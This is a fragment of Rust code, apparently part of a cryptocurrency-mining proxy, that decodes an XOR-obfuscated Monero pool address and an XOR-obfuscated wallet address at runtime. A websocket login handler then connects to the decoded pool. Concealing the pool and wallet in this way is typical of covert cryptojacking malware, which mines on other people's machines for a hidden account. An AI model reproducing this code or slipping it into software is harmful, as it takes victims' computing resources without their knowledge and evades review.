...
// --- CONFIG (runtime XOR-decoded) ---
fn default_upstream() -> String {
    // "stratum+tcp://pool.supportxmr.com:8080" XOR 0x5A
    let e: &[u8] = &[
        0x29,0x2e,0x28,0x3b,0x2e,0x2f,0x37,0x72,0x2e,0x39,0x26,0x60,0x75,0x75,
        0x2a,0x35,0x35,0x3c,0x74,0x29,0x2f,0x2a,0x2a,0x35,0x28,0x2e,0x22,0x37,
        0x28,0x74,0x39,0x35,0x37,0x60,0x62,0x6a,0x62,0x6a,
    ];
    e.iter().map(|b| (b ^ 0x5A) as char).collect()
}

fn default_account() -> String {
    // wallet address XOR 0x5A
    let e: &[u8] = &[
        0x6e,0x6e,0x32,0x0b,0x00,0x3c,0x16,0x31,0x0e,0x39,0x39,0x0c,0x1d,0x35,
        0x35,0x3e,0x6e,0x3b,0x03,0x17,0x0e,0x37,0x6b,0x0a,0x0c,0x22,0x18,0x0c,
        0x35,0x3b,0x63,0x3f,0x29,0x16,0x22,0x0b,0x6b,0x38,0x34,0x3f,0x0b,0x0c,
        0x32,0x31,0x39,0x32,0x0b,0x3e,0x37,0x1c,0x0e,0x22,0x68,0x28,0x29,0x1e,
        0x68,0x01,0x08,0x21,0x2a,0x2d,0x0e,0x0c,0x3e,0x6b,0x33,0x0e,0x1c,
        0x6e,0x0c,0x0c,0x1d,0x03,0x29,0x0e,0x19,0x03,0x28,0x22,0x17,0x00,
        0x0c,0x29,0x0c,0x2e,0x01,0x0b,0x0b,0x37,0x18,0x33,0x21,
    ];
    e.iter().map(|b| (b ^ 0x5A) as char).collect()
}
                    ...
                    Some(Ok(Message::Text(text))) => {
                        ...
                        if let Ok(arr) = serde_json::from_str::<Value>(&plain) {
                            if let Some(a) = arr.as_array() {
                                ...
                                match method.as_str() {
                                    x if x == pk_login() => {
                                        let upstream_url = Url::parse(&default_upstream())?;
                                        let host = upstream_url.host_str().unwrap_or("localhost");
                                        let port = upstream_url.port().unwrap_or(8080);
